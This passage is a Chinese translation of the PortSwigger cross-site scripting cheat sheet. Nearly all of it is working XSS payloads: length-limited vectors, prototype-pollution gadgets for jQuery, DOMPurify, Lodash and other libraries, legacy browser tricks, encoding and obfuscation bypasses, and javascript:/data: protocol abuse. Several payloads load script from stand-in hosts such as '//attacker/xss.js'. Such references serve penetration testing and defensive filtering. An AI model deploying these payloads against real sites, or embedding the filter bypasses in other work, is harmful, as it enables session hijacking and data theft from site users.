| innerHTML context, no equals allowed | URL 解码参数但分割 `=` 后赋值给 innerHTML。`<script>` 无效，无法使用 `=` 创建事件 | N/A | N/A |
| Basic context length limit 15 | HTML 上下文，长度限制 15 字符 | 15 | `<q oncut=alert\`\`` (16 chars) |
| Attribute context length limit 14 | 属性上下文，长度限制 14 字符 | 14 | `"oncut=alert\`\`` (15 chars with trailing space) |
| Basic context, arbitrary code length limit 19 | 最短执行任意代码的 payload | 19 | `<q oncut=eval(name)` |
| Attribute context, arbitrary code length limit | 属性注入，最短执行任意代码 | 17 | See link |
| Frameset injection before body | 注入在 `<frameset>` 内 `<body>` 之前，`=` 被过滤 | N/A | N/A |
| Single-quoted string, charset `a-z0-9+'.` only | Luan Herrera 解决了此挑战 | N/A | N/A |
| Double-quoted src attribute of img | 双引号被编码，需要在 quoted src 中找到 XSS 方式 | N/A | N/A |

---

## 13. Prototype Pollution（原型污染）

当可以设置 `Object.prototype` 属性时，利用第三方库的特性触发 XSS。

| Library | Payload | Author | Fingerprint |
|---------|---------|--------|-------------|
| Wistia Embedded Video | `Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';` | William Bowling | `typeof wistiaEmbeds !== 'undefined'` |
| jQuery `$(x).off` | `Object.prototype.preventDefault='x'; Object.prototype.handleObj='x'; Object.prototype.delegateTarget='<img/src/onerror=alert(1)>'; $(document).off('foobar');` | Sergey Bobrov | `typeof $ !== 'undefined' && typeof $.fn.jquery !== 'undefined'` |
| jQuery `$(html)` | `Object.prototype.div=['1','<img src onerror=alert(1)>','1']; $('<div x="x"></div>');` | Sergey Bobrov | 同上 |
| jQuery `$.get` (>=3.0.0) | `Object.prototype.url = ['data:,alert(1)//']; Object.prototype.dataType = 'script'; $.get('https://google.com/');` | Michal Bentkowski | 同上 |
| jQuery `$.getScript` (>=3.4.0) | `Object.prototype.src = ['data:,alert(1)//']; $.getScript('https://google.com/');` | s1r1us | 同上 |
| jQuery `$.getScript` (3.0.0-3.3.1) | `Object.prototype.url = 'data:,alert(1)//'; $.getScript('https://google.com/');` | s1r1us | 同上 |
| Google reCAPTCHA | `Object.prototype.srcdoc=['<script>alert(1)<\/script>'];` | s1r1us | `typeof recaptcha !== 'undefined'` |
| Twitter Universal Website Tag | `Object.prototype.hif = ['javascript:alert(document.domain)'];` | Sergey Bobrov | `typeof twq !== 'undefined'` |
| Tealium Universal Tag | `Object.prototype.attrs = {src:1}; Object.prototype.src='//attacker/xss.js';` | Sergey Bobrov | `typeof utag !== 'undefined'` |
| Akamai Boomerang | `Object.prototype.BOOMR = 1; Object.prototype.url='//attacker/xss.js';` | s1r1us | `typeof BOOMR !== 'undefined'` |
| Lodash (<=4.17.15) | `Object.prototype.sourceURL = 'alert(1)'; _.template('test');` | Alex Brasetvik | `typeof _.template !== 'undefined'` |
| sanitize-html | `Object.prototype['*'] = ['onload'];` | Michal Bentkowski | `typeof sanitizeHtml !== 'undefined'` |
| js-xss | `Object.prototype.whiteList = {img: ['onerror', 'src']};` | Michal Bentkowski | `typeof filterXSS !== 'undefined'` |
| DOMPurify (<=2.0.12) | `Object.prototype.ALLOWED_ATTR = ['onerror', 'src'];` | Michal Bentkowski | `typeof DOMPurify !== 'undefined'` |
| DOMPurify (<=2.0.12) | `Object.prototype.documentMode = 9;` | Michal Bentkowski | 同上 |
| Closure HtmlSanitizer | `const sanitizer = new goog.html.sanitizer.HtmlSanitizer(); ...` | Michal Bentkowski | `typeof goog !== 'undefined'` |
| Closure CLOSURE_BASE_PATH | `Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';` | Michal Bentkowski | `typeof goog.basePath !== 'undefined'` |
| Marionette.js / Backbone.js | `Object.prototype.tagName = 'img'; Object.prototype.src = ['x:x']; Object.prototype.onerror = ['alert(1)'];` | Sergey Bobrov | `typeof Marionette !== 'undefined'` or `typeof Backbone !== 'undefined'` |
| Adobe Dynamic Tag Management | `Object.prototype.src='data:,alert(1)//';` | Sergey Bobrov | `typeof _satellite !== 'undefined'` |
| Embedly Cards | `Object.prototype.onload = 'alert(1)';` | Guilherme Keerok | `typeof window.embedly !== 'undefined'` |
| Segment Analytics.js | `Object.prototype.script = [1,'<img/src/onerror=alert(1)>','...'];` | Sergey Bobrov | `typeof analytics !== 'undefined'` |
| Knockout.js | `Object.prototype[4]="a':1,[alert(1)]:1,'b"; Object.prototype[5]=','; ko.applyBindings({});` | Michal Bentkowski | - |
| jQuery `$(x).on` | `Object.prototype.on = 'click'; $('body').on('click', function() { alert('Injected Event'); });` | Andrei Nicolaiciuc | `typeof $.fn.jquery !== 'undefined'` |

---

## 14. Classic Vectors（经典/历史向量）

### 14.1 XSS Crypt (经典加密向量)

#### 14.1.1 Image src 使用 JavaScript 协议

```html
<img src="javascript:alert(1)">
```

#### 14.1.2 Body background 使用 JavaScript 协议

```html
<body background="javascript:alert(1)">
```

#### 14.1.3 Iframe data URL（现代浏览器使用 null origin）

```html
<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
```

#### 14.1.4 VBScript 协议（仅 IE）

```html
<a href="vbscript:MsgBox+1">XSS</a>
<a href="#" onclick="vbs:Msgbox+1">XSS</a>
<a href="#" onclick="vbscript:Msgbox+1">XSS</a>
<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
```

#### 14.1.5 JScript compact（仅 IE）

```html
<a href="#" onclick="jscript.compact:alert(1);">test</a>
```

#### 14.1.6 JScript.Encode（仅 IE）

```html
<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
```

#### 14.1.7 VBScript.Encode（仅 IE）

```html
<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
```

#### 14.1.8 JavaScript 实体（Netscape Navigator）

```html
<a title="&{alert(1)}">XSS</a>
```

#### 14.1.9 JavaScript 样式表（Netscape Navigator）

```html
<link href="xss.js" rel=stylesheet type="text/javascript">
```

#### 14.1.10 Button 消费标记

```html
<form><button name=x formaction=x><b>stealme
```

#### 14.1.11 IE9 select + plaintext 消费标记

```html
<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
```

#### 14.1.12 XBL 绑定（适用于 Firefox <=2）

```html
<div style="-moz-binding:url(//attacker/xbl.xml#xss)">
```

#### 14.1.13 CSS 表达式（适用于 IE <=7）

```html
<div style=xss:expression(alert(1))>
<div style=xss:expressio\6e(alert(1))>
```

#### 14.1.14 Behaviors 行为（旧版 IE 模式）

```html
<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
```

#### 14.1.15 函数中的事件处理器（旧版 IE）

```html
<script> function window.onload(){ alert(1); } </script>
<script> function window::onload(){ alert(1); } </script>
```

#### 14.1.16 GreyMagic HTML+time 漏洞利用

```html
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"></BODY></HTML>
```

### 14.2 浏览器特定向量

#### 14.2.1 Firefox -- & 后允许 NULL 字符（适用于 Firefox）

```html
<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
```

#### 14.2.2 Firefox -- 命名实体内部允许 NULL 字符（适用于 Firefox）

```html
<a href="javascript&colon;alert(1)">Firefox</a>
```

#### 14.2.3 Firefox -- 注释内部允许 NULL 字符（适用于 Firefox）

```html
<!-- ><img title="--><iframe/onload=alert(1)>"> -->
```

#### 14.2.4 Safari -- SVG 内任意标签可用 onload（适用于 Safari）

```html
<svg><xss onload=alert(1)>
```

#### 14.2.5 Isindex 元素（已废弃）（适用于 Chrome、Firefox、Safari）

```html
<isindex type=image src="//evil?">
<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?">
<isindex type=submit formaction=javascript:alert(1)>
<isindex type=submit action=javascript:alert(1)>
```

#### 14.2.6 Chrome -- discard 标签和 onbegin 事件（适用于 Chrome）

```html
<svg><discard onbegin=alert(1)>
```

#### 14.2.7 SVG use 元素配合外部 URL（适用于 Chrome、Firefox、Safari）

```html
<svg><use href="//attacker/upload.php#x" /></svg>
```

#### 14.2.8 Firefox -- onloadstart / onloadend（<=v107）（适用于 Firefox）

```html
<img src=validimage.png onloadstart=alert(1)>
<input type=image onloadend=alert(1) src=validimage.png>
```

#### 14.2.9 Firefox -- marquee 事件（<=v125）（适用于 Firefox）

```html
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
<marquee onstart=alert(1)>XSS</marquee>
```

#### 14.2.10 Firefox -- menu onshow 事件（<=v102）（适用于 Firefox）

```html
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
```

#### 14.2.11 可赋值协议（适用于 Chrome、Safari）

```html
<script>location.protocol='javascript'</script>
<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
```

#### 14.2.12 SVG use 元素配合 data URL base64（适用于 Chrome、Firefox）

```html
<svg><use href="data:image/svg+xml;base64,...#x" /></svg>
```

#### 14.2.13 JavaScript 协议配合换行符（适用于 Chrome、Firefox、Safari）

```html
<a href="javascript://%0aalert(1)">XSS</a>
```

#### 14.2.14 Base 标签配合 JavaScript 协议（Safari）（适用于 Safari）

```html
<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
```

#### 14.2.15 Object/Embed 配合 JavaScript 协议（Firefox <=140）（适用于 Firefox）

```html
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<object data=# codebase=javascript:alert(document.domain)//>
<object data="# alert(1)" codebase=javascript://>
<embed src="# alert(1)" codebase=javascript://>
```

#### 14.2.16 Firefox -- window.name 配合 onerror 和 throw（适用于 Firefox）

```html
<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
```

#### 14.2.17 Firefox -- SVG/Body 配合 onerror/throw 和 URL（适用于 Firefox）

```html
<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}">
<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}">
```

#### 14.2.18 SVG use 元素实现导航（适用于 Chrome、Firefox）

```html
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
```

#### 14.2.19 Animate 标签配合自动执行 use 元素（适用于 Chrome、Firefox）

```html
<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
```

#### 14.2.20 Firefox -- onbeforescriptexecute / onafterscriptexecute（适用于 Firefox）

```html
<x onbeforescriptexecute=alert(1)><script>1</script>
<x onafterscriptexecute=alert(1)><script>1</script>
```

---

## 15. Encoding / Obfuscation（编码与混淆）

### 15.1 超长 UTF-8 编码（适用于 Chrome、Firefox、Safari）

```
%C0%BCscript>alert(1)</script>
%E0%80%BCscript>alert(1)</script>
%F0%80%80%BCscript>alert(1)</script>
%F8%80%80%80%BCscript>alert(1)</script>
%FC%80%80%80%80%BCscript>alert(1)</script>
```

### 15.2 Unicode escapes（适用于 Chrome、Firefox、Safari）

```html
<script>alert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>
```

### 15.3 十六进制编码 JavaScript 转义（适用于 Chrome、Firefox、Safari）

```html
<script>eval('\x61lert(1)')</script>
```

### 15.4 Octal encoding（适用于 Chrome、Firefox、Safari）

```html
<script>eval('\141lert(1)')</script>
<script>eval('alert(\061)')</script>
```

### 15.5 十进制编码（可选分号）（适用于 Chrome、Firefox、Safari）

```html
<a href="&#106;avascript:alert(1)">XSS</a>
<a href="&#106avascript:alert(1)">XSS</a>
<a href="&#0000106avascript:alert(1)">XSS</a>
```

### 15.6 SVG script 配合 HTML 编码（适用于 Chrome、Firefox、Safari）

```html
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
```

### 15.7 十六进制编码实体（适用于 Chrome、Firefox、Safari）

```html
<a href="&#x6a;avascript:alert(1)">XSS</a>
<a href="j&#x61vascript:alert(1)">XSS</a>
<a href="&#x0000006a;avascript:alert(1)">XSS</a>
<a href="&#X6A;avascript:alert(1)">XSS</a>
```

### 15.8 HTML entities（适用于 Chrome、Firefox、Safari）

```html
<a href="javascript&colon;alert(1)">XSS</a>
<a href="java&Tab;script:alert(1)">XSS</a>
<a href="java&NewLine;script:alert(1)">XSS</a>
<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
```

### 15.9 URL encoding（适用于 Chrome、Firefox、Safari）

```html
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
```

### 15.10 HTML 实体 + URL 编码（适用于 Chrome、Firefox、Safari）

```html
<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
```

### 15.11 Data 协议 base64 编码（适用于 Chrome、Firefox、Safari）

```html
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
```

### 15.12 Iframe srcdoc HTML 编码（适用于 Chrome、Firefox、Safari）

```html
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
```

### 15.13 Img 标签配合 base64 编码（适用于 Chrome、Firefox、Safari）

```html
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
```

---

## 16. Protocols（协议利用）

### 16.1 Iframe src 使用 JavaScript 协议（适用于 Chrome、Firefox、Safari）

```html
<iframe src="javascript:alert(1)">
```

### 16.2 标准 JavaScript 协议（适用于 Chrome、Firefox、Safari）

```html
<a href="javascript:alert(1)">XSS</a>
```

### 16.3 协议大小写不敏感（适用于 Chrome、Firefox、Safari）

```html
<a href="JaVaScript:alert(1)">XSS</a>
```

### 16.4 协议前允许控制字符（适用于 Chrome、Firefox、Safari）

```html
<a href=" javascript:alert(1)">XSS</a>
```

### 16.5 协议内部允许控制字符（适用于 Chrome、Firefox、Safari）

```html
<a href="javas cript:alert(1)">XSS</a>
<a href="javascript :alert(1)">XSS</a>
```

### 16.6 SVG xlink:href 属性（适用于 Chrome、Firefox、Safari）

```html
<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
```

### 16.7 SVG animate tag（适用于 Chrome、Firefox、Safari）

```html
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
```

### 16.8 SVG set 标签（适用于 Chrome、Firefox、Safari）

```html
<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>
```

### 16.9 Data 协议在 script src 中（适用于 Chrome、Firefox、Safari）

```html
<script src="data:text/javascript,alert(1)"></script>
```

### 16.10 SVG script href 属性（无闭合标签）（适用于 Chrome、Firefox、Safari）

```html
<svg><script href="data:text/javascript,alert(1)" />
```

### 16.11 Import 语句配合 data URL（适用于 Chrome、Firefox、Safari）

```html
<script>import('data:text/javascript,alert(1)')</script>
```

### 16.12 MathML 可点击元素（适用于 Firefox）

```html
<math><x href="javascript:alert(1)">blah
```

### 16.13 Button/Input formaction 属性（适用于 Chrome、Firefox、Safari）

```html
<form><button formaction=javascript:alert(1)>XSS
<form><input type=submit formaction=javascript:alert(1) value=XSS>
<form action=javascript:alert(1)><input type=submit value=XSS>
```

### 16.14 Animate 标签配合 keytimes（适用于 Chrome、Firefox、Safari）

```html
<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
```

### 16.15 Embed code 属性（适用于 Chrome）

```html
<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
```

### 16.16 Object param 参数（适用于 Chrome）

```html
<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
```

### 16.17 Navigation navigate 方法（适用于 Chrome、Firefox、Safari）

```html
<script>navigation.navigate('javascript:alert(1)')</script>
```

---

## 17. Other Useful Attributes（其他实用属性）

### 17.1 srcdoc 属性（适用于 Chrome、Firefox、Safari）

```html
<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
```

### 17.2 从页面任意位置点击提交（适用于 Chrome、Firefox、Safari）

```html
<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
```

### 17.3 隐藏/link 元素上的 accesskey 属性（适用于 Firefox、Chrome）

```html
<input type="hidden" accesskey="X" onclick="alert(1)"> (ALT+SHIFT+X on Windows)
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

### 17.4 Download 属性（适用于 Chrome、Firefox、Safari）

```html
<a href=# download="filename.html">Test</a>
```

### 17.5 禁用 Referrer（适用于 Chrome、Firefox、Safari）

```html
<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
```

### 17.6 通过 window.open 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<a href=# onclick="window.open('//target/xss.php?x=%27;eval(name)//','alert(1)')">XSS</a>
```

### 17.7 通过 iframe name 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<iframe name="alert(1)" src="//target/xss.php?x=%27;eval(name)//"></iframe>
```

### 17.8 通过 base target 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<base target="alert(1)"><a href="//target/xss.php?x=%27;eval(name)//">XSS via target in base tag</a>
```

### 17.9 通过 a 标签 target 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<a target="alert(1)" href="//target/xss.php?x=%27;eval(name)//">XSS via target in a tag</a>
```

### 17.10 通过 img usemap 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="//target/xss.php?x=%27;eval(name)//"></map>
```

### 17.11 通过 form target 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<form action="//target/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
```

### 17.12 通过 formtarget 设置 window.name（适用于 Chrome、Firefox、Safari）

```html
<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="//target/xss.php" formtarget="alert(1)" value="XSS via formtarget"></form>
```

### 17.13 Meta charset UTF-7（适用于 Chrome、Firefox、Safari）

```html
<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

### 17.14 UTF-7 BOM 字符（适用于 Chrome、Firefox、Safari）

```
+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

### 17.15 升级不安全请求（适用于 Chrome、Firefox、Safari）

```html
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
```

### 17.16 通过 iframe sandbox 禁用 JavaScript（适用于 Chrome、Firefox、Safari）

```html
<iframe sandbox src="//portswigger-labs.net"></iframe>
```

### 17.17 禁用 Referer（适用于 Chrome、Firefox、Safari）

```html
<meta name="referrer" content="no-referrer">
```

### 17.18 Bootstrap 事件（适用于 Chrome、Firefox、Safari）

```html
<xss class=progress-bar-animated onanimationstart=alert(1)>
<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
```

---

> 来源: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
> 参考: [XSS Payloads (分类版)](../XSS%20Payloads/XSS%20Payloads.md) | [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [JavaScript for XSS](../JavaScript%20for%20XSS/JavaScript%20for%20XSS.md)
